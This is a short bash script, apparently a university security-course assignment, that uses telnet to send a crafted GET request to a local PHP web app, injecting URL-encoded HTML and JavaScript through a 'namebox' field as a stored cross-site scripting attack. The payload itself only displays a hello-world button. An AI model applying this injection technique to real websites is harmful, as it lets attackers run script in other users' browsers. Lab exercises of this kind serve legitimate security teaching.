#!/bin/bash

# A sploit that violated in incomplete mediation, I will be supply bad input to name box 

# initialize
url="http%3A%2F%2Fwww.google.ca"
userName="alice"

usage(){
    echo "bad arguments, expected 2 arguments"
    exit 1
}

if [ ${#} -ne 2 ]; then usage; fi

echo "Sploit2: this sploit will provide a crafted website name to namebox, and execute some malicious html/javascript code to the web"

{
# open up telnet to the web server
echo "open ${1} ${2}"
sleep 1

# First, we need to login to the website as Bob/Alice in order to enable the "submit a url", or actually we dont have to(another sploit).
# Then, we can supply a crafted website name that contains malicious html/script code
maliciousCode="CS456_A2_SPLOIT%26lt%3B%2FA%26gt%3B%3C%2FTD%3E%3Cscript+type%3D%5C%22text%2Fjavascript%5C%22%3Efunction+DisplayHelloWorld%28%29%7Bdocument.write%28%5C%22HELLO+WORLD%5C%22%29%3B%7D%3C%2Fscript%3E%3C%2Fhead%3E%3Cbody%3E%3Ch1%3ECS458+sploit%3C%2Fh1%3E%3Cp+id%3D%5C%22demo%5C%22%3Eyou+can+put+malicious+html%2Fjavascript+code+here.+I+will+make+a+hello+world+button.%3C%2Fp%3E%3Cbutton+type%3D%5C%22button%5C%22+onclick%3D%5C%22DisplayHelloWorld%28%29%5C%22%3EHello+World%3C%2Fbutton%3E"

# submit
echo "GET http://127.0.0.1:8080/index.php?namebox=${maliciousCode}&urlbox=${url}&submitter=${userName} HTTP/1.0"
echo
echo

sleep 1
} | telnet > /dev/null

